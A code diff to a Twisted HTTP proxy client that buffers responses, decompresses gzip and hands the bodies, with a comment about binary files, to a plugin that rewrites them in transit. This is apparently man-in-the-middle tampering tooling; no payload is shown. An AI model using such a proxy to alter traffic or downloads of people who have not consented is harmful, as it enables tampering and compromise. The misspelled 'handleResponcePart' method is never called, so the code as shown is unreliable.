@@ -7,14 +7,19 @@ class ProxyClient(proxy.ProxyClient):
 
     def __init__(self, command, rest, version, headers, data, father):
         self.father = father
-	self.client = father
         self.command = command
         self.rest = rest
+        self.data = ""
+        if "proxy-connection" in headers:
+            del headers["proxy-connection"]
+        headers["connection"] = "close"
         self.headers = headers
-        self.data = data
         self.isCompressed = False
         self.contentLength = None
         self.plugin = None
+
+    def handleResponcePart(self, data):
+        self.data += data
 
     def handleHeader(self, key, value):
         # change response header here
@@ -36,30 +41,26 @@ class ProxyClient(proxy.ProxyClient):
 
         proxy.ProxyClient.handleHeader(self, key, value)
 
-    def handleResponsePart(self, data):
-	log.msg("Response handler")
+    def handleResponseEnd(self):
+        log.msg("Response handler")
         if self.isCompressed:
-            log.msg("compressed skipping")
-            #self.client.write(data)
-            #self.shutdown()
-            #return
-            #data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
+            log.msg("Decompressing")
+            self.data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(self.data)).read()
 
         #log.msg( "Read from server:\n" + data)
         #frak with bin files here.
-        if self.plugin and not self.isCompressed:
-	    log.msg("Plugin running...")
-            data = self.plugin.frak(data)
+        if self.plugin:
+            log.msg("Plugin running...")
+            self.data = self.plugin.frak(self.data)
 
-        if self.contentLength != None:
-            self.client.setHeader('Content-Length', len(data))
+        #if self.contentLength != None:
+        #    self.father.setHeader('Content-Length', len(data))
 
-        self.client.write(data)
-        #self.shutdown()
+        self.father.transport.write(self.data)
 
-    def shutdown(self):
-         self.client.finish()
-         self.transport.loseConnection()
+    #def shutdown(self):
+    #     self.father.transport.finish()
+    #     self.father.transport.loseConnection()
 
 
 
